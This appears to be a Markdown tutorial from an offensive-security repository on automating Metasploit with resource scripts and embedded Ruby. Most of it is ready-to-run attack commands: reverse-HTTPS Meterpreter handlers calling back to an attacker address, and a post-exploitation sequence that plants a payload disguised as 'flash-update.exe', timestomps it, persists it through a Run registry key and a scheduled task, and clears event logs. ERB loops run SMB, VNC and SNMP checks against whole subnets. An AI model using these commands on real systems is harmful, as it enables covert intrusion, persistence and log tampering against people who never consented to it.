## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually, they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | commands syntax |
|-------|---|---|
| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r my_resource_file.rc |
| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/my_resource_file.rc | 
| resource scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
| resource scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/my_resource_file.rc |
| using ruby in RC (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | <ruby>run_single("use exploit/windows/smb/ms08_067_netapi")</ruby> |

<br />

## REFERENCIES

- [Rapid7 resource files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [INULBR metasploit-automatizacao](http://blog.inurl.com.br/2015/02/metasploit-automatizacao-resource-files_23.html#more)
- [Offensiveinfosec writing-resource-scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/)

---

<br /><br /><br />

##  HOW TO RUN RESOURCE SCRIPTS?
<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole with the resource command or you can run a resource script when you start msfconsole with the -r flag from msfconsole.</blockquote>

      msfconsole -r my_resource_file.rc
      msfconsole -r /root/my_resource_file.rc
      msf > resource /root/my_resource_file.rc
      meterpreter > resource /root/my_resource_file.rc

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## HOW TO WRITE RESOURCE SCRIPTS?
<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands in a file, which can be used with the resource command.</blockquote>

- **Create a resource file to display the version number of metasploit (manually)::**`[bash prompt]`<br />

      touch my_resource_file.rc
      echo 'version' > my_resource_file.rc

    `[run]` msfconsole -r my_resource_file.rc

- **Create a resource file to display the version number of metasploit (makerc)::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > version
      msf > makerc /root/my_resource_file.rc

    `[run]` msf > resource /root/my_resource_file.rc

<br /><br />

<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days passed we dont remmenber the handler configuration set that day, thats one<br />of the ways rc scripting can be used for, besides automating the framework (erb scripting can access metasploit api).</blockquote>

- **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />

      touch my_resource_file.rc

         echo 'use exploit/multi/handler' > my_resource_file.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
         echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
         echo 'set LPORT 666' >> my_resource_file.rc
         echo 'exploit' >> my_resource_file.rc

    `[run]` msfconsole -r my_resource_file.rc

- **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > use exploit/multi/handler
      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
      msf exploit(multi/handler) > set LHOST 192.168.1.71
      msf exploit(multi/handler) > set LPORT 666
      msf exploit(multi/handler) > exploit

      msf exploit(multi/handler) > makerc /root/my_resource_file.rc

    `[run]` msf > resource /root/my_resource_file.rc

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN POST EXPLOITATION

- **FFF**

      getsystem
      screenshot -v -p IClass.jpeg -v true
      run post/windows/manage/migrate
      run post/windows/gather/checkvm
      run post/windows/gather/enum_logged_on_users
      run post/windows/gather/enum_applications

<br />

- **FFF**

      getsystem
      run migrate -n explorer.exe
      upload flash-update.exe %temp%\\flash-update.exe
      timestomp -z '3/10/1999 15:15:15' %temp%\\flash-update.exe
      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\flash-update.exe
      run scheduleme -m 10 -c "%temp%\\flash-update.exe"
      clearev

<br />


- **Handler::AutoRunScript::**`[bash prompt]`<br />

      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_command -rc /root/my_resource_file.rc; exploit'

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN AutoRunScript

- **RC::AutoRunScript::**`[resource_script.rc]`<br />

      set AutoRunScript /root/my_resource_file.rc

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## USING RUBY IN RC (ERB scripting)
<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br /><br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple core or meterpreter commands together with ruby syntax (api).</blockquote>

- **ERB scripting (ruby)::**`[resource_script.rc]`<br />

      workspace -a http_title
      db_nmap -Pn -T4 -n -v -p 80 --open 192.168.33.0/24
      use auxiliary/scanner/http/title
         <ruby>
           run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
         </ruby>
      run

<br />

- **FFF**

      setg 192.168.1.71 192.168.1.254

<br />

      <ruby>
      framework.db.hosts.each do |h|
         h.services.each do |serv|
 
         if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i
                next if (serv.port != 445)
                print_good("#{h.address} seems to be Windows #{h.os_flavor}...")
                self.run_single("use exploit/windows/smb/ms08_067_netapi")
                print_good("Running ms08_067_netapi check against #{h.address}")
                self.run_single("set RHOST #{h.address}")
                self.run_single("check")
   
         elsif serv.port == 5900 and h.os_name =~/Linux/i
                next if (serv.port != 5900)
                print_good("#{h.address} seems to be Linux #{h.os_flavor}...")
                self.run_single("use auxiliary/scanner/vnc/vnc_none_auth")
                print_good("Running VNC no auth check against #{h.os_flavor}")
                self.run_single("set RHOSTS #{h.address}")
                self.run_single("run")
 
         else
                print_error("#{h.address} does not have port 445/5900 open")
                return nil 
         end
       end
      end
      </ruby>

<br />

- **FFF**

      setg 192.168.1.71 192.168.1.254

<br />

      <ruby>
        print_line("")
        print_status("Please wait, checking if RHOSTS are set globally...")
          if (framework.datastore['RHOSTS'] == nil)
            print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
          return nil
        end

        # Using nmap to populate metasploit database (db_nmap)
        print_good("RHOSTS set globally [ OK ] running scans...")
        run_single("db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}")

        # Displays msf database results stored into 'services' and 'vulns' 
        run_single("services #{framework.datastore['RHOSTS']}")
        run_single("vulns #{framework.datastore['RHOSTS']}")
        print_line("")
        print_good("Please wait, running msf auxiliary modules...")
      </ruby>

      # running msf auxiliary modules
      use auxiliary/scanner/snmp/snmp_enum
      run
      use auxiliary/scanner/snmp/snmp_enumusers
      run
      use auxiliary/scanner/snmp/snmp_enumshares
      run

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## Suspicious Shell Activity (Red Team) @2019


